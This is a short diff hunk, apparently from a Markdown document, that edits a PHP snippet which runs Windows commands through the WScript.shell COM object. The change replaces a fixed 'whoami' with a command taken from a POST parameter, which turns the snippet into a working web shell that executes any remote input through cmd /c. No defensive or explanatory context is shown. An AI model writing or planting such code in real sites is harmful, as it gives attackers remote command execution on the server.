@@ -12,7 +12,7 @@
 
 ```
 <?php
-$command="whoami";
+$command=$_POST['cmd'];
 $wsh = new COM('WScript.shell');
 $exec = $wsh->exec("cmd /c ".$command);
 $stdout = $exec->StdOut();
